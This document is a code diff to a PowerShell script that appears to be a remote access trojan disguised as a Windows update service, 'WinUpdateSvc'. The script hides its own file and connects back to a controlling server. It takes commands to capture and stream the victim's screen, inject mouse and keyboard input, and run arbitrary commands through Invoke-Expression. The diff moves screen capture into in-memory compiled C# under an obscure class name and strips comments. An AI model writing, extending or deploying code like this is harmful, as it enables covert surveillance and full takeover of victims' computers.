@@ -13,7 +13,6 @@ $serverPort = 4000
 $installName = "WinUpdateSvc"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
-# ===== CORREÇÃO DO BOM =====
 $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
 
 # ===== VERIFICAR ADMIN =====
@@ -39,54 +38,62 @@ try {
 } catch {}
 attrib +h +s +r $scriptPath 2>$null
 
-# ===== ASSEMBLIES E P/INVOKE =====
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-
-if (-not ("Win32Input" -as [type])) {
-    Add-Type @"
+# ===== C# COMPILADO EM MEMÓRIA PARA CAPTURA E INPUT =====
+if (-not ("R9KCore" -as [type])) {
+    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
     using System;
+    using System.Drawing;
+    using System.Drawing.Imaging;
+    using System.IO;
     using System.Runtime.InteropServices;
-    public class Win32Input {
+    using System.Windows.Forms;
+
+    public class R9KCore {
         [DllImport("user32.dll")]
         public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
         [DllImport("user32.dll")]
         public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+
+        public static string CaptureScreen(int maxW, long quality) {
+            try {
+                Rectangle bounds = Screen.PrimaryScreen.Bounds;
+                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height)) {
+                    using (Graphics g = Graphics.FromImage(bmp)) {
+                        g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
+                    }
+                    
+                    Bitmap finalBmp = bmp;
+                    if (maxW > 0 && bmp.Width > maxW) {
+                        int newW = maxW;
+                        int newH = (int)(bmp.Height * ((float)maxW / bmp.Width));
+                        finalBmp = new Bitmap(newW, newH);
+                        using (Graphics g2 = Graphics.FromImage(finalBmp)) {
+                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBilinear;
+                            g2.DrawImage(bmp, 0, 0, newW, newH);
+                        }
+                    }
+
+                    using (MemoryStream ms = new MemoryStream()) {
+                        EncoderParameters ep = new EncoderParameters(1);
+                        ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
+                        ImageCodecInfo codec = GetEncoder(ImageFormat.Jpeg);
+                        finalBmp.Save(ms, codec, ep);
+                        if (finalBmp != bmp) finalBmp.Dispose();
+                        return Convert.ToBase64String(ms.ToArray());
+                    }
+                }
+            } catch { return null; }
+        }
+
+        private static ImageCodecInfo GetEncoder(ImageFormat format) {
+            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
+            foreach (ImageCodecInfo codec in codecs) {
+                if (codec.FormatID == format.Guid) return codec;
+            }
+            return null;
+        }
     }
 "@
-}
-
-# ===== FUNÇÕES =====
-function Get-FrameB64 {
-    param([int]$maxW = 1280, [int]$quality = 55)
-    try {
-        $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-        $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
-        $g = [System.Drawing.Graphics]::FromImage($bmp)
-        $g.CopyFromScreen($b.X, $b.Y, 0, 0, $bmp.Size)
-        $g.Dispose()
-        
-        if ($bmp.Width -gt $maxW -and $maxW -gt 0) {
-            $dw = $maxW
-            $dh = [int]($bmp.Height * $maxW / $bmp.Width)
-            $small = New-Object System.Drawing.Bitmap $dw, $dh
-            $g2 = [System.Drawing.Graphics]::FromImage($small)
-            $g2.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBilinear
-            $g2.DrawImage($bmp, 0, 0, $dw, $dh)
-            $g2.Dispose(); $bmp.Dispose(); $bmp = $small
-        }
-        
-        $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' } | Select-Object -First 1
-        $ep = New-Object System.Drawing.Imaging.EncoderParameters 1
-        $ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality), [int64]$quality
-        
-        $ms = New-Object System.IO.MemoryStream
-        $bmp.Save($ms, $codec, $ep)
-        $bmp.Dispose()
-        
-        $bytes = $ms.ToArray(); $ms.Dispose()
-        return [Convert]::ToBase64String($bytes)
-    } catch { return $null }
 }
 
 # ===== CONEXAO PRINCIPAL =====
@@ -110,11 +117,8 @@ while ($true) {
             if ($stream.DataAvailable) {
                 $cmd = $reader.ReadLine()
                 if ([string]::IsNullOrEmpty($cmd)) { continue }
-                
-                # Trim para remover qualquer \r invisível e evitar UNKNOWN
                 $cmd = $cmd.Trim()
 
-                # --- CONTROLE DO STREAM ---
                 if ($cmd -eq 'stream_start') {
                     $streaming = $true
                     continue
@@ -126,7 +130,6 @@ while ($true) {
                 }
                 if ($cmd -eq 'exit') { throw "exit" }
 
-                # --- COMANDOS ---
                 $parts = $cmd -split ' ', 2
                 $verb = $parts[0]
                 $arg  = if ($parts.Count -gt 1) { $parts[1] } else { '' }
@@ -134,7 +137,7 @@ while ($true) {
                 $response = ""
                 switch ($verb) {
                     'screenshot' {
-                        $b64 = Get-FrameB64 -maxW 3840 -quality 85
+                        $b64 = [R9KCore]::CaptureScreen(3840, 85)
                         if ($b64) { $writer.WriteLine("SCREEN:$b64") } else { $writer.WriteLine("SCREEN_ERROR") }
                     }
                     'move' {
@@ -147,28 +150,22 @@ while ($true) {
                         }
                     }
                     'md' {
-                        if ($arg -eq '1') { [Win32Input]::mouse_event(0x0002, 0,0,0,0) }
-                        elseif ($arg -eq '2') { [Win32Input]::mouse_event(0x0008, 0,0,0,0) }
-                        elseif ($arg -eq '3') { [Win32Input]::mouse_event(0x0020, 0,0,0,0) }
+                        if ($arg -eq '1') { [R9KCore]::mouse_event(0x0002, 0,0,0,0) }
+                        elseif ($arg -eq '2') { [R9KCore]::mouse_event(0x0008, 0,0,0,0) }
+                        elseif ($arg -eq '3') { [R9KCore]::mouse_event(0x0020, 0,0,0,0) }
                     }
                     'mu' {
-                        if ($arg -eq '1') { [Win32Input]::mouse_event(0x0004, 0,0,0,0) }
-                        elseif ($arg -eq '2') { [Win32Input]::mouse_event(0x0010, 0,0,0,0) }
-                        elseif ($arg -eq '3') { [Win32Input]::mouse_event(0x0040, 0,0,0,0) }
+                        if ($arg -eq '1') { [R9KCore]::mouse_event(0x0004, 0,0,0,0) }
+                        elseif ($arg -eq '2') { [R9KCore]::mouse_event(0x0010, 0,0,0,0) }
+                        elseif ($arg -eq '3') { [R9KCore]::mouse_event(0x0040, 0,0,0,0) }
                     }
                     'mw' {
-                        $d = [int]$arg
-                        [Win32Input]::mouse_event(0x0800, 0,0,[uint32]$d,0)
+                        [R9KCore]::mouse_event(0x0800, 0,0,[uint32][int]$arg,0)
                     }
-                    'kd' {
-                        [Win32Input]::keybd_event([byte][int]$arg, 0, 0, [UIntPtr]::Zero)
-                    }
-                    'ku' {
-                        [Win32Input]::keybd_event([byte][int]$arg, 0, 2, [UIntPtr]::Zero)
-                    }
+                    'kd' { [R9KCore]::keybd_event([byte][int]$arg, 0, 0, [UIntPtr]::Zero) }
+                    'ku' { [R9KCore]::keybd_event([byte][int]$arg, 0, 2, [UIntPtr]::Zero) }
                     'lock_mouse' { $response = "MOUSE_LOCKED" }
                     'unlock_mouse' { $response = "MOUSE_UNLOCKED" }
-                    'test' { $response = "PONG" }
                     'ping' { $response = "PONG" }
                     'exec' {
                         try { $response = Invoke-Expression $arg 2>&1 | Out-String }
@@ -181,9 +178,8 @@ while ($true) {
                 Start-Sleep -Milliseconds 20
             }
 
-            # --- LOOP DE ENVIO DE FRAMES ---
             if ($streaming -and $client.Connected) {
-                $b64 = Get-FrameB64 -maxW 1280 -quality 55
+                $b64 = [R9KCore]::CaptureScreen(1280, 55)
                 if ($b64) {
                     try { $writer.WriteLine("SCREEN:$b64") } catch { break }
                 }
